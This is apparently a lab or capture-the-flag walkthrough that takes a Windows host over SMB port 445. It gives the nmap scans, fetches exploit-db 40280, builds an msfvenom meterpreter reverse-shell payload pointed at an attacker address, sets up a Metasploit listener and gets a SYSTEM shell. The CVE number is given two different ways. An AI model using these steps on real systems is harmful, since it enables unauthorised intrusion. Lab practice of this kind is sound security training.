Foothold

Foothold 

1. Scan for open ports. We see that port 445 is open.
`sudo nmap -p- 192.168.132.40`
![da226d34b9555c8b4272516acfef09c6.png](../../../../_resources/6f2e609d173e4a3c94345ff6cf6898cc.png)


2. Scan port 445 for vulnerabilities. We see mention of cve-2009-2013
`sudo nmap -p445 --script "smb*vuln*" 192.168.132.40`
![ac25989842e14334fa9929731ebb7702.png](../../../../_resources/4680113c61d641f19e99410eeae89130.png)


3. Google search "cve-2009-3103"
![afc20a954f2e393a337ca0f2f998be3f.png](../../../../_resources/df1f4a63f56143229f07fd12dab68383.png)


4. Download from exploit-db EDB-ID 40280
`searchsploit -m 40280`
![9a241525168818b946745b15787f8af4.png](../../../../_resources/4d7a0fbfaa194a738f8e2b9e1ec20735.png)


5. Generate the payload according to the comment in 40280.py
`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.49.132 lport=443 exitfunc=thread -f python`
![111e3ac2e43c3fe2aa200715e237724b.png](../../../../_resources/38224da35f5c4db1b5110c8bfbd4151f.png)


6. Substitute the shell variable payload generated during the previous step.
[40280.py](../../../../_resources/cc7122765a9d4383863ed95913fb17d5.py)
![ec3900482834b013c845441946310ea1.png](../../../../_resources/77bab7233b3347f6be97da0a8f1445ef.png)


7. Start a Metasploit multi/handler
`sudo msfconsole`
`use multi/handler`
`set payload windows/meterpreter/reverse_tcp`
`set lhost 192.168.49.132`
`set lport 443`
`exploit`
![606826d57f43209343dfb6990661f316.png](../../../../_resources/522e3e25a4b54aa2b5a646b3184dc755.png)


8. Run the exploit script 40280.py
`python 40280.py 192.168.132.40`
![6009081545701f01141507dbb6ec6dfd.png](../../../../_resources/0a38ac71b9d748e792f0469aff976ba8.png)


9. We get a meterpreter session with SYSTEM user.
`shell`
`whoami`
`cd c:\Users\Administrators\Desktop`
`more proof.txt`
`ipconfig`
![547232765c914db61808cd5c2f739cd2.png](../../../../_resources/287b6d8f36474a7a8db06c66f73c5808.png)



